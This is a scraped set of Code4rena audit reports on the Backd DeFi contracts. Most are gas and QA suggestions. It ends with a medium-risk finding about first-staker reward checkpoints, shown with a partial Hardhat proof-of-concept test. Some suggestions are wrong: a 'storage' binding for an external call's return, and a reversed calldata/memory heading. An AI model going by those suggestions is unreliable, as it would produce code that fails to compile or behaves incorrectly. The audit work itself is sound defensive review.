C4-009 : Use Shift Right/Left instead of Division/Multiplication if possible  ## Impact  A division/multiplication by any number x being a power of 2 can be calculated by shifting log2(x) to the right/left.  While the DIV opcode uses 5 gas, the SHR opcode only uses 3 gas. Furthermore, Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting.  ## Proof of Concept  Contracts  ## Tools Used  None  ## Recommended Mitigation Steps  A division/multiplication by any number x being a power of 2 can be calculated by shifting log2(x) to the right/left.    # C4-010 : Cache array length in for loops can save gas  ## Impact  Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  Caching the array length in the stack saves around 3 gas per iteration.  ## Proof of Concept  1. Navigate to the following smart contract line.  ```   protocol/contracts/tokenomics/InflationManager.sol::116 => for (uint256 i; i < stakerVaults.length; i = i.uncheckedInc()) {   protocol/contracts/tokenomics/VestedEscrow.sol::94 => for (uint256 i; i < amounts.length; i = i.uncheckedInc()) {   protocol/contracts/zaps/PoolMigrationZap.sol::22 => for (uint256 i; i < newPools_.length; ++i) {   protocol/contracts/zaps/PoolMigrationZap.sol::39 => for (uint256 i; i < oldPoolAddresses_.length; ) {   protocol/libraries/EnumerableExtensions.sol::19 => uint256 len = addresses.length();  ```  ## Tools Used  None  ## Recommended Mitigation Steps  Consider to cache array length.   # C4-011 : State Variables that can be changed to immutable   ## Impact  Solidity 0.6.5 introduced immutable as a major feature. It allows setting contract-level variables at construction time which gets stored in code rather than storage.  Consider the following generic example:  ``` contract C {    /// The owner is set during contruction time, and never changed afterwards.    address public owner = msg.sender; } ```  In the above example, each call to the function owner() reads from storage, using a sload. After EIP-2929, this costs 2100 gas cold or 100 gas warm. However, the following snippet is more gas efficient:  ``` contract C {    /// The owner is set during contruction time, and never changed afterwards.    address public immutable owner = msg.sender; } ```  In the above example, each storage read of the owner state variable is replaced by the instruction push32 value, where value is set during contract construction time. Unlike the last example, this costs only 3 gas.  ## Proof of Concept  1. Navigate to the following smart contract line.  ``` https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L39 ```  ## Tools Used  None  ## Recommended Mitigation Steps  Consider using immutable variable.    # C4-012 : Use calldata instead of memory for function parameters  ## Impact   In some cases, having function arguments in calldata instead of memory is more optimal.  Consider the following generic exam"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/128", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "### Unchecked Gas Optimisation in Minter.sol A check is already made to make sure that `issuedNonInflationSupply` does not exceed a certain value so an arithmetic overflow is not possible  Change `issuedNonInflationSupply += amount;` to `unchecked { issuedNonInflationSupply += amount;} `  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L150-L154  ### Unchecked Gas Optimisations in AmmGauge.sol We can make another unchecked addition because `totalStaked` will always be larger than `balances[user]`  Change ``` balances[account] += staked; totalStaked += staked; ```  to ``` totalStaked += staked; unchecked { balances[account] += staked; }  ```  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L112-L113  In Line 134 and 135 Change ``` balances[msg.sender] -= unstaked; totalStaked -= unstaked; ``` to  ``` balances[msg.sender] -= unstaked; unchecked { totalStaked -= unstaked } ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L134-L135  ### KeeperGauge.sol Change `epoch++` to `++epoch` as talked about [here](https://www.reddit.com/r/ethdev/comments/tcwspw/i_vs_i_gas_efficiency/) https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L59 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L98  Change ```         keeperRecords[beneficiary].feesInPeriod[epoch] += amount;         perPeriodTotalFees[epoch] += amount; ``` to ```         perPeriodTotalFees[epoch] += amount;         unchecked { keeperRecords[beneficiary].feesInPeriod[epoch] += amount; }          ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L87-L88  # BkdLocker.sol As we already make a value check we do not need to worry about arithmetic overflow Wrap `unchecked` around ```         totalStashed[msg.sender] += amount; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L119-L123  Again we have a similar issue  Change ```         totalStashed[msg.sender] -= totalAvailableToWithdraw;         uint256 newTotal = balances[msg.sender] - totalAvailableToWithdraw;         _userCheckpoint(msg.sender, 0, newTotal);         totalLocked -= totalAvailableToWithdraw; ``` to ```         totalStashed[msg.sender] -= totalAvailableToWithdraw;         uint256 newTotal = balances[msg.sender] - totalAvailableToWithdraw;         _userCheckpoint(msg.sender, 0, newTotal);         unchecked { totalLocked -= totalAvailableToWithdraw; } ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L149-L152  `curRewardTokenData.feeBalance` will always be larger than or equal to `curRewardTokenData.userShares[msg.sender]` of any user so we can change Line 216 to `unchecked { curRewardTokenData.feeBalance -= claimable; }`  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L214-L216  ### Gas Savings in `_userCheckpoint()` in `BkdLocker.sol` Contract Variables such as `boostFactors` and `curRewardTokenData` are read multiple times throughout the contract. This requires multiple SLOAD operations which are very expensive. It is better to load the variables into memory and use those when reading while the storage variables can be used for writing.  See [here](https://dev.to/javier123454321/solidity-gas-optimization-pt1-4271) for more info i.e. ```                RewardTokenData storage curRewardTokenData = rewardTokenData[rewardToken];           // Compute the share earned by the user since they last updated         uint256 userBalance = balances[user];         if (userBalance > 0) {             curRewardTokenData.userShares[user] += (curRewardTokenData.feeIntegral -                 curRewardTokenData.userFeeIntegrals[user]).scaledMul(                     userBalance.scaledMul(boostFactors[user])                 );  ``` can be changed to ```         RewardTokenData storage curRewardTokenData = rewardTokenData[rewardToken];         RewardTokenData memory _curRewardTokenData = curRewardTokenData           // Compute the share earned by the user since they last updated         uint256 userBalance = balances[user];         if (userBalance > 0) {             curRewardTokenData.userShares[user] += (_curRewardTokenData.feeIntegral -                 _curRewardTokenData.userFeeIntegrals[user]).scaledMul(                     userBalance.scaledMul(boostFactors[user])                 ); ```  This also applies to `boostFactors` and `prevRewardTokenData`  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L292-L335  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/127", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "#1 Memory to storage  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L39  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L54  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L41  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L21  use storage instead of memory can reduce the gas. i suggest to change          address[] memory pools = addressProvider.allPools(); to          address[] storage pools = addressProvider.allPools(); apply to others  #2 Use memory instead calldata  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L43  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L124  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L59  In the external functions where the function argument is read-only, the function() has an inputed parameter that using memory, if this function didnt change the parameter, its cheaper to use calldata then memory. so we suggest to change it.      function burnToTarget(address[] memory tokens_, address targetLpToken_) to      function burnToTarget(address[] calldata tokens_, address targetLpToken_) apply to others.  #3 use != 0 instead of >0   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L91  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L137  for unsigned integer, >0 is less efficient then !=0, so use !=0 instead of >0. do to all line code.  #4 Caching lpgauge  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L161-L162              ILpGauge(lpGauge).userCheckpoint(src);             ILpGauge(lpGauge).userCheckpoint(dst); to the memory for reduce the gas fee because it use multiple times.  #5 Pre increment  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L59  using pre increment more cheaper than post increment. so, i sugget to change           epoch++; to          ++epoch;  #6 change string to bytes32  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L152  reduce size of error message can reduce the gas fee. i suggest to convert string to bytes32  #7 Caching the length  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L22  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L39  caching the array length can reduce gas it caused access to a local variable is more cheap than query storage / calldata / memory in solidity."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/126", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "Typos   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L237 ```solidity      * @param key Key to feeze ``` Change `feeze` to `freeze`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L173 ```solidity      * @dev This does not invlude the gov. tokens queued for withdrawal. ``` Change `invlude` to `include`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L29 ```solidity     event Burned(address targetLpToken, uint256 amountBurned); // Emmited after a successfull burn to target lp token ``` Change `Emmited` to `Emitted`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L35 ```solidity     receive() external payable {} // Recieve function for withdrawing from Backd ETH Pool ``` Change `Recieve` to `Receive`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L84 ```solidity         // Transfering LP tokens back to sender ``` Change `Transfering` to `Transferring`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L532 ```solidity     //TOOD: See if this is still needed somewhere ``` Change `TOOD` to `TODO`   Issue: `Require` error message typo  Explanation: Messages should provide clear information for users to understand reason for failure  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L29 ```solidity         require(_annualInflationDecayAmm < ScaledMath.ONE, Error.INVALID_PARAMETER_VALUE); ``` Change the referenced error message from `delay be at least 3 days` to `delay must be at least 3 days`   Issue: Sensitive terms in both the comments and the code should be updated  Explanation: Terms incorporating \"white,\" \"black,\" \"master\" or \"slave\" are potentially problematic. Substituting more neutral terminology is becoming [common practice](https://www.zdnet.com/article/mysql-drops-master-slave-and-blacklist-whitelist-terminology/)   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L336 ```solidity      * @param strategyPool The pool of the strategy to register (avoids blacklisting other addresses). ``` Suggestion: Change `blacklisting` to `denylisting`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L64 ```solidity         require(!_whiteListedFeeHandlers.contains(feeHandler), Error.ADDRESS_WHITELISTED); ``` Suggestion: Change 'whitelisted' to 'allowlisted' in each case   Similarly for the following instances of 'whitelist' and its variations:  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L36  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L65  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L71-L72  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L302  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L51  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L181  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L452  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L79-L80   Issue: TODOs that have not been addressed Explanation: Open TODOs should be worked through and removed  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L532 ```solidity     //TOOD: See if this is still needed somewhere ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/125", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "Issue: `Require` message is too long Explanation: The `require` revert strings referenced below can be shortened to 32 characters or fewer (as shown) to save gas   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L296 ```solidity         require(!_stakerVaults.contains(token), Error.STAKER_VAULT_EXISTS); ``` Change the referenced error message from `a staker vault already exists for the token` to `token already has staker vault`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L59 ```solidity         require(currentUInts256[_START_BOOST] == 0, Error.CONTRACT_INITIALIZED); ``` Change the referenced error message from `contract can only be initialized once` to `contract already initialized`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L60 ```solidity         require(_minter != address(0), Error.INVALID_MINTER); ``` Change the referenced error message from `the minter address of the LP token and the pool address do not match` to `minter and pool address mismatch`   The same error message occurs in the lines referenced below:  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L72  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L73  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L74  Example: ```solidity         require(_annualInflationDecayAmm < ScaledMath.ONE, Error.INVALID_PARAMETER_VALUE); ``` Change the referenced error message from `invalid parameter value attempted` to `invalid parameter value attempt`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L150-L153 ```solidity         require(             issuedNonInflationSupply + amount <= nonInflationDistribution,             \"Maximum non-inflation amount exceeded.\"         ); ``` Change error message to `Max non-inflation amt exceeded`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L110 ```solidity         require(block.timestamp >= deadline, Error.DEADLINE_NOT_REACHED); ``` Change the referenced error message from `deadline has not been reached yet` to `deadline not yet reached`   Issue: Should use `!= 0` instead of `> 0` in a `require` statement if variable is an unsigned integer (`uint`)   Explanation: `!= 0` should be used where possible since `> 0` costs more gas  The same `require` occurs in all three lines below:  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L91  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L104  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L125  ```solidity         require(amount > 0, Error.INVALID_AMOUNT); ``` Change `amount > 0` to `amount != 0` in each case   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L92 ```solidity         require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS); ``` Change `totalLockedBoosted > 0` to `totalLockedBoosted != 0`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L137 ```solidity         require(length > 0, \"No entries\"); ``` Change `length > 0` to `length != 0`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L140 ```solidity         require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); ``` Change `totalClaimable > 0` to `totalClaimable != 0`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L84 ```solidity         require(unallocatedSupply > 0, \"No reward tokens in contract\"); ``` Change `unallocatedSupply > 0` to `unallocatedSupply != 0`   Issue: Variables should not be initialized to their default values  Explanation: For example, initialization of `booleans` to their default value of `false` is unnecessary and costs gas  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L412 ```solidity         bool keeperGaugeExists = false; ``` Change to `bool keeperGaugeExists;`   Issue: Array length should not be looked up in every iteration of a `for` loop  Explanation: Calculating the array length costs gas  Recommendation: Read the length of the array from memory before executing the loop   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L82 ```solidity         for (uint256 i; i < roles.length; i = i.uncheckedInc()) { ``` Recommendation: ```solidity         uint256 totalRolesLength = roles.length;          for (uint256 i; i < totalRolesLength; i = i.uncheckedInc()) { ``` Similarly for the seven `for` loops referenced below:  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L42  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L259  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L56  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L116  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L94  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L22  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L39  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/124", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": " ### 1. array length in loops can be cached instead of calculating in every iteration  The loop bounds are calculated with `array.length` which are calculated in every loop iterations which can result in high gas. The array length can be cached instead of calculating in every loop iteration to save gas.  ```solidity // Before for (uint i = 0; i < amounts.length; i++) { }  // After uint len = amounts.length; for (uint i = 0; i < len; i++) { } ```  The instances where this pattern can be applied is found as follows  ```solidity > grep -rn './contracts/tokenomics' -e 'for.*[.]length' ./contracts/tokenomics/FeeBurner.sol:59:        for (uint256 i; i < tokens_.length; i = i.uncheckedInc()) { ./contracts/tokenomics/VestedEscrow.sol:94:        for (uint256 i; i < amounts.length; i = i.uncheckedInc()) { ./contracts/tokenomics/InflationManager.sol:119:        for (uint256 i; i < stakerVaults.length; i = i.uncheckedInc()) { ```  ### 2. Use solidity custom errors to save gas  solidity 0.8.4 introduces custom errors which are cheaper than using revert strings in terms of gas Use the custom error patterns to reduce gas cost.  for eg.  ```solidity    // Before   require(condition, \"Revert strings\");    // After   error CustomError();   if (!condition) {     revert CustomError();   } ```  more details can be found [here](https://blog.soliditylang.org/2021/04/21/custom-errors/)  ### 3. `!=0` is cheaper than `>0`  - In require statement, using `!=0` is cheaper than using `>0` for uints  ```solidity > grep -rn \"./contracts/tokenomics\" -e \"require(.* > 0\" ./contracts/tokenomics/AmmConvexGauge.sol:158:        require(amount > 0, Error.INVALID_AMOUNT); ./contracts/tokenomics/AmmConvexGauge.sol:171:        require(amount > 0, Error.INVALID_AMOUNT); ./contracts/tokenomics/VestedEscrow.sol:84:        require(unallocatedSupply > 0, \"No reward tokens in contract\"); ./contracts/tokenomics/KeeperGauge.sol:142:        require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); ./contracts/tokenomics/AmmGauge.sol:111:        require(amount > 0, Error.INVALID_AMOUNT); ./contracts/tokenomics/AmmGauge.sol:136:        require(amount > 0, Error.INVALID_AMOUNT); ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/123", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "### 1. Emitted event reports wrong value  In the function `stakeFor()` the event should report `staked` instead of `amount`  ```solidity     function stakeFor(address account, uint256 amount) public virtual override returns (bool) {         ........         uint256 staked = newBal - oldBal;         balances[account] += staked;         totalStaked += staked;         emit AmmStaked(account, ammToken, amount);         // recommendation         // emit AmmStaked(account, ammToken, staked);     } ```  - [AmmGauge.sol#L66](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L66) - Same for function `unstakeFor()` [AmmGauge.sol#L136](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L136)  ### 2. Use Two-Step Transfer Pattern for Access Controls  - It is  possible that the role accidentally transfers ownership to the wrong address, resulting in a loss of the role.  - For example : [setMinter()](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L58-L63)  Recommendation:  ```solidity address minter; address temporaryMinter;  function setMinter(address owner_) external onlyGovernance {   temporaryMinter = owner_; }  function claimOwnership() external {   require(msg.sender == temporaryMinter);   minter = temporaryMinter;   temporaryOwner = address(0); } ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/121", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# QA Report  ## [L-01] Missing zero address check  If parameter is accidentally set to zero the contract will have to be redeployed  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L96 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/Authorization.sol#L10 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L33 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L50 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L26 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L40 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/BkdToken.sol#L21 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L72  ## [L-02] Ownership transfer should be done in two steps https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L58-L63  Consider implementing a two step process where `minter` nominates an account and the nominated account needs to call an `acceptMinter` function for the transfer of ownership to fully succeed.  This ensures the nominated EOA account is a valid and active account.  Other instance:  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L68-L78  ## [N-01] Typo https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L35  ```solidity Recieve ``` Change to \"Receive\"  ## [N-02] Remove TODO  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L532  ```solidity //TOOD: See if this is still needed somewhere ``` Also please fix wrong (but comical) spelling in future `TODO` notes."}, {"title": "THE FIRST AMM STAKER MAY NOT RECEIVE ACCORDING REWARDS BECAUSE OF POOR CHECKPOINTS", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/111", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L56 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L140   # Vulnerability details  ## Impact The first staker within the `AmmGauge` may not get the rewards if the pool is not checkpointed right after he stakes and before he wants to claim the rewards.  ## Proof of Concept A testing environment that reproduces how the protocol is going to be deployed and managed is used to evaluate this case under the following assumptions and simplifications.   1) The inflation rate is fixed for simplicity (`0.001`).  2) For the testing environment performed by the team, a DummyERC20 was used as testing token. The same is done on the exploit environment. 3) The minting of tokens impact both on the inflation calculation and their balance. But this test evaluates the states just before minting (claimable balances). Following how the pools are updated, they are checkpointed in the end of the `_executeInflationRateUpdate` call. Not while staking.  In order to illustrate this scenario we will show both the vulnerable and non vulnerable situations.  Vulnerable Situation: 1) Alice, Bob, Charlie and David are future users of the pool. They all notice the inception of this project and decide to stake. 2) They all stake the same amount. Their transactions are mined with 1min of difference starting from Alice and finishing with David. 3) There is no external pool checkpoint between Alice and Bob (besides the one that is triggered when Bob stakes). 4) Sometime happens and they all want to check their accumulated reward balance. Alice accumulated much less than the others.  Non Vulnerable Situation: - The same as before but calling externally `_poolCheckpoint()` between Alice stake call and Bobs' and before checking the accumulated rewards.  The code to show this has a `secureCheckpoints` toggle that can be set as true or false to trigger (or not) the intermediate poolCheckpoints.          it('First Staker Rewards Calculation', async function () {                           let secureCheckpoints = false;             let currentShare, currentStakedIntegral, balances;             await this.ammgauge.poolCheckpoint();             await ethers.provider.send(\"evm_increaseTime\", [1 * 24 * 60 * 60]); // 10 days                          const updateStates = async (from) => {                  currentShare = await this.ammgauge.perUserShare(from.address);                 currentStakedIntegral = await this.ammgauge.perUserStakedIntegral(from.address);                 balances = await this.ammgauge.balances(from.address);             }              const stake = async (to, amount) => {                 await updateStates(to)                 console.log(\" \")                 // Balance before                 let balanceBefore = await this.ammgauge.balances(to.address);                 // Stake                 await this.ammgauge.connect(to).stake(amount);                 expect(await this.ammgauge.balances(to.address)).to.be.eq(balanceBefore.add(amount));                 await updateStates(to);                 console.log(\" \")             }              const unstake = async (to, amount) => {                 await updateStates(to)                 console.log(\" \")                 // Balance before                 let balanceBefore = await this.ammgauge.balances(to.address);                 // Stake                 await this.ammgauge.connect(to).unstake(amount);                 expect(await this.ammgauge.balances(to.address)).to.be.eq(balanceBefore.sub(amount));                 await updateStates(to);                 console.log(\" \")             }              // Each user stakes tokens             let initialStaking = ethers.utils.parseEther(\"10\")             console.log(\" \")             console.log(\"USERS STAKE\");             for (const user of users) {             await stake(user, initialStaking)             if(secureCheckpoints){await this.ammgauge.poolCheckpoint()};             await ethers.provider.send(\"evm_increaseTime\", [60 * 60]); // 1hr between stakes             }             console.log(\" \")              await ethers.provider.send(\"evm_increaseTime\", [ 5 * 24 * 60 * 60]); // 5 days             if(secureCheckpoints){await this.ammgauge.poolCheckpoint()};              let claimableRewards = [];             let claimedRewards = [];             console.log(\" \")             console.log(\"USERS 